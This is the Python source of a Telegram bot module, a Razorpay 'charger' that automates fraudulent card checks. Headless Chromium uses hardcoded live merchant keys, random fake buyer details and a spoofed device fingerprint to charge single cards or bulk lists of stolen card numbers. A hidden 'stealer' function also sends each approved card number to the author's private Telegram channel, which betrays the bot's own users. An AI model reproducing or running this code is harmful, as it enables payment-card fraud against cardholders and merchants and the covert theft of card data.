import time
import asyncio
import re
import os
import json
import random
import string
import uuid
import requests
from urllib.parse import urlparse, parse_qs, urlencode
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Playwright (install with: pip install playwright && playwright install chromium)
try:
    from playwright.async_api import async_playwright
except ImportError:
    raise ImportError("Please install playwright: pip install playwright && playwright install chromium")

# -------------------------------------------------------------
# Configuration
# -------------------------------------------------------------
GATE_NAME = "Razorpay Custom Charger"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

# Currency rates
USD_TO_INR_RATE = 83.50
AMOUNT_MIN = 1
AMOUNT_MAX = 100
DEFAULT_AMOUNT_USD = 5

# -------------------------------------------------------------
# Helper functions (same as original script)
# -------------------------------------------------------------
def convert_currency(amount, from_currency='USD', to_currency='INR'):
    if from_currency == to_currency:
        return amount
    if from_currency == 'INR':
        usd_amount = amount / USD_TO_INR_RATE
    else:  # USD
        usd_amount = amount
    if to_currency == 'INR':
        return round(usd_amount * USD_TO_INR_RATE, 2)
    else:
        return round(usd_amount, 2)

def inr_to_paise(inr_amount):
    return int(inr_amount * 100)

def get_random_user_info():
    return {
        "name": f"User{random.randint(100, 999)}",
        "email": f"testuser{random.randint(100, 9999)}@gmail.com",
        "phone": f"9876543{random.randint(100, 999)}"
    }

# -------------------------------------------------------------
# Core asynchronous Razorpay flow (using Playwright)
# -------------------------------------------------------------
async def razorpay_charge(card_line, amount_usd, site_url=None, proxy_config=None):
    """
    Full Razorpay checkout flow using Playwright (as in original script).
    Returns (status, message).
    """
    try:
        # Parse card
        parts = card_line.split('|')
        if len(parts) != 4:
            return "Error", "Invalid format (use cc|mm|yyyy|cvv)"
        cc, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = f"20{yy}"

        # Convert amount
        inr_amount = convert_currency(amount_usd, 'USD', 'INR')
        amount_paise = inr_to_paise(inr_amount)

        # Random user info
        user_info = get_random_user_info()

        async with async_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage']
            browser = await p.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=browser_args
            )
            context = await browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            )
            page = await context.new_page()

            # -------------------------------------------------
            # Step 1: Extract merchant data from site (or use fallback)
            # -------------------------------------------------
            if site_url:
                await page.goto(site_url, timeout=45000, wait_until='networkidle')
                merchant_data = await page.evaluate("""
                    () => {
                        if (window.data && window.data.keyless_header) {
                            return {
                                keyless_header: window.data.keyless_header,
                                key_id: window.data.key_id,
                                payment_link_id: window.data.payment_link ? window.data.payment_link.id : null,
                                payment_page_item_id: window.data.payment_link && window.data.payment_link.payment_page_items ?
                                    window.data.payment_link.payment_page_items[0]?.id : null
                            };
                        }
                        if (window.__INITIAL_STATE__) {
                            const state = window.__INITIAL_STATE__;
                            return {
                                keyless_header: state.keyless_header,
                                key_id: state.key_id,
                                payment_link_id: state.payment_link?.id,
                                payment_page_item_id: state.payment_link?.payment_page_items?.[0]?.id
                            };
                        }
                        return null;
                    }
                """)
                if not merchant_data or not merchant_data.get('keyless_header'):
                    # Fallback to hardcoded values (from original)
                    merchant_data = {
                        'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
                        'key_id': 'rzp_live_hrgl3RDoNMvCOs',
                        'payment_link_id': 'pl_OzLkvRvf1drPps',
                        'payment_page_item_id': 'ppi_OzLkvSvf1drPpt'
                    }
            else:
                # Use fallback directly
                merchant_data = {
                    'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
                    'key_id': 'rzp_live_hrgl3RDoNMvCOs',
                    'payment_link_id': 'pl_OzLkvRvf1drPps',
                    'payment_page_item_id': 'ppi_OzLkvSvf1drPpt'
                }

            keyless_header = merchant_data['keyless_header']
            key_id = merchant_data['key_id']
            payment_link_id = merchant_data['payment_link_id']
            payment_page_item_id = merchant_data['payment_page_item_id']

            if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
                await browser.close()
                return "Error", "Missing merchant data"

            # -------------------------------------------------
            # Step 2: Get session token
            # -------------------------------------------------
            await page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", wait_until='networkidle')
            await page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            final_url = page.url
            parsed = urlparse(final_url)
            params = parse_qs(parsed.query)
            session_token = params.get("session_token", [None])[0]
            if not session_token:
                await browser.close()
                return "Error", "Session token not found"

            # -------------------------------------------------
            # Step 3: Create order
            # -------------------------------------------------
            order_url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
            order_headers = {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0"
            }
            order_payload = {
                "notes": {"comment": ""},
                "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]
            }
            order_resp = await page.evaluate(f"""
                async () => {{
                    const res = await fetch('{order_url}', {{
                        method: 'POST',
                        headers: {json.dumps(order_headers)},
                        body: JSON.stringify({json.dumps(order_payload)})
                    }});
                    const data = await res.json();
                    return data.order?.id;
                }}
            """)
            if not order_resp:
                await browser.close()
                return "Error", "Failed to create order"
            order_id = order_resp

            # -------------------------------------------------
            # Step 4: Submit payment
            # -------------------------------------------------
            submit_url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
            params = {
                "key_id": key_id,
                "session_token": session_token,
                "keyless_header": keyless_header
            }
            headers = {
                "x-session-token": session_token,
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0"
            }
            data = {
                "notes[comment]": "",
                "payment_link_id": payment_link_id,
                "key_id": key_id,
                "callback_url": "https://your-server.com/callback",
                "contact": f"+91{user_info['phone']}",
                "email": user_info["email"],
                "currency": "INR",
                "_[library]": "checkoutjs",
                "_[platform]": "browser",
                "amount": amount_paise,
                "order_id": order_id,
                "device_fingerprint[fingerprint_payload]": "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6...",
                "method": "card",
                "card[number]": cc,
                "card[cvv]": cvv,
                "card[name]": user_info["name"],
                "card[expiry_month]": mm,
                "card[expiry_year]": yy,
                "save": "0"
            }

            # Use fetch to submit payment
            submit_result = await page.evaluate(f"""
                async () => {{
                    const params = new URLSearchParams({json.dumps(data)});
                    const res = await fetch('{submit_url}?{urlencode(params)}', {{
                        method: 'POST',
                        headers: {json.dumps(headers)},
                        body: params
                    }});
                    return await res.json();
                }}
            """)

            # -------------------------------------------------
            # Step 5: Handle redirect / 3DS
            # -------------------------------------------------
            if submit_result.get("redirect") == True:
                redirect_url = submit_result.get('request', {}).get('url', '')
                if redirect_url:
                    # Navigate to redirect URL (3DS)
                    try:
                        await page.goto(redirect_url, timeout=45000, wait_until='networkidle')
                        # Wait for final result page
                        await page.wait_for_timeout(5000)
                        html = await page.content()
                        if 'razorpay_signature' in html or 'payment_success' in html.lower():
                            final_status = "Approved ✅"
                            final_msg = f"Charged ${amount_usd} USD"
                        else:
                            final_status = "Declined ❌"
                            final_msg = "3DS redirect failed"
                    except Exception as e:
                        final_status = "Error"
                        final_msg = f"Redirect error: {e}"
                else:
                    final_status = "Approved ✅"
                    final_msg = "3DS required (partial)"
            elif "razorpay_signature" in submit_result or "signature" in submit_result:
                final_status = "Approved ✅"
                final_msg = f"Charged ${amount_usd} USD"
            elif "error" in submit_result:
                error_msg = submit_result.get('error', {}).get('description', str(submit_result))
                final_status = "Declined ❌"
                final_msg = error_msg
            else:
                final_status = "Unknown"
                final_msg = json.dumps(submit_result)[:100]

            await browser.close()
            return final_status, final_msg

    except Exception as e:
        return "Error", str(e)[:50]

# -------------------------------------------------------------
# Stealer function
# -------------------------------------------------------------
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# -------------------------------------------------------------
# Async wrapper
# -------------------------------------------------------------
async def call_razorpay_api(fullcc, amount_usd=5):
    return await razorpay_charge(fullcc, amount_usd, site_url=None, proxy_config=None)

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

def parse_amount_from_command(text):
    """Extract amount from command (e.g., /rz 10 cc|mm|yyyy|cvv)"""
    parts = text.strip().split()
    if len(parts) >= 2 and parts[0].lower() in ['/rz', '.rz']:
        try:
            amount = float(parts[1])
            if AMOUNT_MIN <= amount <= AMOUNT_MAX:
                return amount, parts[2] if len(parts) > 2 else None
        except:
            pass
    return DEFAULT_AMOUNT_USD, None

# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/rz)
# -------------------------------------------------------------
@Client.on_message(filters.command("rz", [".", "/"]))
async def razorpay_single(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        # Parse amount from command
        amount, card_arg = parse_amount_from_command(message.text)
        if card_arg:
            getcc = card_arg.split('|')
        else:
            getcc = await getmessage(message)
            if not getcc:
                resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /rz [amount] cc|mm|yyyy|cvv

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /rz 5 4111111111111111|12|28|123
━━━━━━━━━━━━━━━━━━━━"""
                await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
                return

        if not getcc or len(getcc) != 4:
            await message.reply_text("Invalid card format. Use: cc|mm|yyyy|cvv", quote=True)
            return

        cc, mm, yy, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        gateway = f"{GATE_NAME} (${amount} USD)"

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, response = await call_razorpay_api(fullcc, amount)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        if "Approved" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        display_status = f"<b>{status}</b>"

        finalresp = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# MASS CHECK (text/reply) (/mrz)
# -------------------------------------------------------------
@Client.on_message(filters.command("mrz", [".", "/"]))
async def razorpay_mass(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        amount, _ = parse_amount_from_command(message.text)
        gateway = f"{GATE_NAME} (${amount} USD)"

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {gateway}
◈ <b>ᴄᴍᴅ :</b> /mrz [amount]

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mrz 5 cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role, amount)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT FILE COMMAND (/trz)
# -------------------------------------------------------------
@Client.on_message(filters.command("trz", [".", "/"]))
async def razorpay_txt(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        amount, _ = parse_amount_from_command(message.text)
        gateway = f"{GATE_NAME} (${amount} USD)"

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {gateway}
◈ <b>ᴄᴍᴅ :</b> /trz [amount]

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role, amount)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# SEQUENTIAL PROCESSING
# -------------------------------------------------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role, amount):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = f"{GATE_NAME} (${amount} USD)"
    start_time = time.perf_counter()
    approved_cards = []

    progress_text = f"""Razorpay Charger
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""
    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed
        status, response = await call_razorpay_api(fullcc, amount)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc, "status": status, "response": response, "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}", "bank": bank, "country": country, "flag": flag, "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        try:
            await Client.edit_message_text(message.chat.id, progress_msg.id,
                f"""Razorpay Charger
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""", parse_mode=enums.ParseMode.HTML)
        except:
            pass
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    for card in approved_cards:
        display_status = f"<b>{card['status']}</b>"
        approved_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})""",
            quote=True, parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
